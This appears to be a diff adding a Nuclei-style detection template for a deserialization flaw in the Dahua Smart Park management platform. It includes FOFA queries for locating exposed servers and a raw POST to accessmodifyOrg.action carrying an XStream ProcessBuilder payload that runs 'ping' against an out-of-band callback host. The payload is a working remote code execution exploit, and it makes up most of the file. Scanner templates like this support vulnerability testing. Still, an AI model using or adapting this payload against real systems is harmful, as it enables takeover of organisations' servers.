@@ -1,0 +1,30 @@
+id: dahua-smart-park-platform-accessmodifyorg-action-deserialization
+info:
+  name: 大华智慧园区综合管理平台 accessmodifyOrg.action 反序列化漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="src=\"/WPMS/asset/common/js/jsencrypt.min.js\"" || body="/WPMS/asset/lib/html5shiv.js" || body="/WPMS/asset/img/black/zhyq.png" || body="/WPMS/asset/common/css/base.css" || body="/WPMS/asset/lib/gridster/" || title="智慧园区综合管理平台" || body="/WPMS/asset/img/black/QR-code-V4.003-owner.png" || body="WPMS/asset/img/black/"
+
+    该漏洞允许攻击者利用 accessmodifyOrg.action 接口中的反序列化缺陷执行恶意代码，导致系统被控制。
+  tags: 大华智慧园区综合管理平台
+http:
+- raw:
+  - |
+    POST /admin/accessmodifyOrg.action HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    xmlInfo=$<Url:GB2312><sorted-set> <string>foo</string> <dynamic-proxy> <interface>java.lang.Comparable</interface>
+          <handler class="java.beans.EventHandler"> <target class="java.lang.ProcessBuilder">
+          <command> <string>ping</string> <string>{{interactsh-url}}</string> </command> </target>
+          <action>start</action> </handler> </dynamic-proxy> </sorted-set></Url>$
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - dns
